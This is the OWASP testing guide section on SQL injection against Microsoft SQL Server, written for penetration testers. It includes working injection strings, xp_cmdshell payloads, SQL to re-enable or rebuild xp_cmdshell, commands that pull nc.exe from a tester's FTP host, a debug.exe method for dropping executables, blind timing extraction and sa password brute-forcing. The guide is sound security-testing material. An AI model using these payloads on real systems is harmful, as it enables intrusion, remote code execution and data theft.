source: OSWAP

### SQL Server Characteristics
Microsoft SQL server has a few unique characteristics, so some exploits need to be specially customized for this application

To begin, let's see some SQL Server operators and commands/stored procedures that are useful in a SQL Injection test:

- comment operator: `--` (useful for forcing the query to ignore the remaining portion of the original query; this won't be necessary in every case)
- query separator: `;` (semicolon)
- Useful stored procedures include:
  - [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) executes any command shell in the server with the same permissions that it is currently running. By default, only `sysadmin` is allowed to use it and in SQL Server 2005 it is disabled by default (it can be enabled again using sp_configure)
  - `xp_regread` reads an arbitrary value from the Registry (undocumented extended procedure)
  - `xp_regwrite` writes an arbitrary value into the Registry (undocumented extended procedure)
  - [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) Spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text. It requires `sysadmin` privileges.
  - [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) Sends an email message, which may include a query result set attachment, to the specified recipients. This extended stored procedure uses SQL Mail to send the message.

Most of these examples will use the `exec` function.

Below we show how to execute a shell command that writes the output of the command `dir c:\inetpub` in a browseable file, assuming that the web server and the DB server reside on the same host. The following syntax uses `xp_cmdshell`:

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

Alternatively, we can use `sp_makewebtask`:

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

Keep in mind that `sp_makewebtask` is deprecated, and, even if it works in all SQL Server versions up to 2005, it might be removed in the future.

The following uses the function `db_name()` to trigger an error that will return the name of the database:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

Notice the use of [convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017):

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` will try to convert the result of `db_name` (a string) into an integer variable, triggering an error, which, if displayed by the vulnerable application, will contain the name of the DB.

The following example uses the environment variable `@@version`, combined with a `union select`-style injection, in order to find the version of the SQL Server.

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

And here's the same attack, but using again the conversion trick:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

In the following, we show several examples that exploit SQL injection vulnerabilities through different entry points.

### Testing for SQL Injection in a GET Request

The most simple (and sometimes most rewarding) case would be that of a login page requesting an username and password for user login. You can try entering the following string "' or '1'='1" (without double quotes):

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

If the application is using Dynamic SQL queries, and the string gets appended to the user credentials validation query, this may result in a successful login to the application.

### Testing for SQL Injection in a GET Request

In order to learn how many columns exist

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### Testing in a POST Request

SQL Injection, HTTP POST Content: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

A complete post example (`https://vulnerable.web.app/forgotpass.asp`):

```txt
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: http://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

The error message obtained when a `'` (single quote) character is entered at the email field is:

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

###  Yet Another (Useful) GET Example

Obtaining the application's source code

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### Custom `xp_cmdshell`

All books and papers describing the security best practices for SQL Server recommend disabling `xp_cmdshell` in SQL Server 2000 (in SQL Server 2005 it is disabled by default). However, if we have sysadmin rights (natively or by bruteforcing the sysadmin password, see below), we can often bypass this limitation.

On SQL Server 2000:

- If `xp_cmdshell` has been disabled with `sp_dropextendedproc`, we can simply inject the following code:

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

- If the previous code does not work, it means that the `xp_log70.dll` has been moved or deleted. In this case we need to inject the following code:

```sql
CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
    DECLARE @result int, @OLEResult int, @RunResult int
    DECLARE @ShellID int
    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OADestroy @ShellID
    return @result
```

This code, written by Antonin Foller (see links at the bottom of the page), creates a new `xp_cmdshell` using `sp_oacreate`, `sp_oamethod` and `sp_oadestroy` (as long as they haven't been disabled too, of course). Before using it, we need to delete the first `xp_cmdshell` we created (even if it was not working), otherwise the two declarations will collide.

On SQL Server 2005, `xp_cmdshell` can be enabled by injecting the following code instead:

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

Once we can use `xp_cmdshell` (either the native one or a custom one), we can easily upload executables on the target DB Server. A very common choice is `netcat.exe`, but any trojan will be useful here. If the target is allowed to start FTP connections to the tester's machine, all that is needed is to inject the following queries:

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

At this point, `nc.exe` will be uploaded and available.

If FTP is not allowed by the firewall, we have a workaround that exploits the Windows debugger, `debug.exe`, that is installed by default in all Windows machines. `Debug.exe` is scriptable and is able to create an executable by executing an appropriate script file. What we need to do is to convert the executable into a debug script (which is a 100% ASCII file), upload it line by line and finally call `debug.exe` on it. There are several tools that create such debug files (e.g.: `makescr.exe` by Ollie Whitehouse and `dbgtool.exe` by `toolcrypt.org`). The queries to inject will therefore be the following:

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

At this point, our executable is available on the target machine, ready to be executed. There are tools that automate this process, most notably `Bobcat`, which runs on Windows, and `Sqlninja`, which runs on Unix (See the tools at the bottom of this page).

### Obtain Information When It Is Not Displayed (Out of Band)

Not all is lost when the web application does not return any information --such as descriptive error messages (cf. [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). For example, it might happen that one has access to the source code (e.g., because the web application is based on an open source software). Then, the pen tester can exploit all the SQL injection vulnerabilities discovered offline in the web application. Although an IPS might stop some of these attacks, the best way would be to proceed as follows: develop and test the attacks in a testbed created for that purpose, and then execute these attacks against the web application being tested.

Other options for out of band attacks are described in [Sample 4 above](#Example-4:-Yet-Another-(Useful)-GET-Example).

### Blind SQL Injection Attacks

#### Trial and Error

For example, if the web application is looking for a book using a query

```sql
select * from books where title="text entered by the user"
```

then the penetration tester might enter the text: `'Bomba' OR 1=1-` and if data is not properly validated, the query will go through and return the whole list of books.

#### If Multiple Error Messages Displayed

It might happen that descriptive error messages are stopped, yet the error messages give some information. For example:

- In some cases the web application (actually the web server) might return the traditional `500: Internal Server Error`, say when the application returns an exception that might be generated, for instance, by a query with unclosed quotes.
- While in other cases the server will return a `200 OK` message, but the web application will return some error message inserted by the developers `Internal server error` or `bad data`.

This one bit of information might be enough to understand how the dynamic SQL query is constructed by the web application and tune up an exploit. Another out-of-band method is to output the results through HTTP browseable files.

#### Timing Attacks

A typical approach uses the `waitfor delay` command: let's say that the attacker wants to check if the `pubs` sample database exists, he will simply inject the following command:

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

Hence, using several queries (as many queries as bits in the required information) the pen tester can get any data that is in the database. Look at the following query

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

Measuring the response time and using different values for `@i`, we can deduce the length of the name of the current database, and then start to extract the name itself with the following query:

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

This query will wait for 5 seconds if bit `@bit` of byte `@byte` of the name of the current database is 1, and will return at once if it is 0. Nesting two cycles (one for `@byte` and one for `@bit`) we will we able to extract the whole piece of information.

This doesn't mean that blind SQL injection attacks cannot be done, as the pen tester should only come up with any time consuming operation that is not filtered. For example

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### Checking for Version and Vulnerabilities

Consider the following query:

`select @@version`

On SQL Server 2005, it will return something like the following:

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

The `2005` part of the string spans from the 22nd to the 25th character. Therefore, one query to inject can be the following:

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

Such query will wait 5 seconds if the 25th character of the `@@version` variable is `5`, showing us that we are dealing with a SQL Server 2005. If the query returns immediately, we are probably dealing with SQL Server 2000, and another similar query will help to clear all doubts.

### Bruteforce of Sysadmin Password

We can inject the following code:

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

What we do here is to attempt a connection to the local database (specified by the empty field after `SQLOLEDB`) using `sa` and `<pwd>` as credentials.

Once we have the sysadmin password, we have two choices:

- Inject all following queries using `OPENROWSET`, in order to use sysadmin privileges
- Add our current user to the sysadmin group using `sp_addsrvrolemember`. The current username can be extracted using inference injection against the variable `system_user`.

Remember that OPENROWSET is accessible to all users on SQL Server 2000 but it is restricted to administrative accounts on SQL Server 2005.

## Tools

- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)

## References

### Whitepapers

- [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Chris Anley, "(more) Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [Steve Friedl's Unixwiz.net Tech Tips: "SQL Injection Attacks by Example"](http://www.unixwiz.net/techtips/sql-injection.html)
- [Alexander Chigrik: "Useful undocumented extended stored procedures"](https://www.databasejournal.com/features/mssql/article.php/1441251/Useful-Undocumented-Extended-Stored-Procedures.htm)
- [Antonin Foller: "Custom xp_cmdshell, using shell object"](https://www.motobit.com/tips/detpg_cmdshell)
- [SQL Injection](https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf)
- [Cesar Cerrudo: Manipulating Microsoft SQL Server Using SQL Injection, uploading files, getting into internal network, port scanning, DOS](https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf)
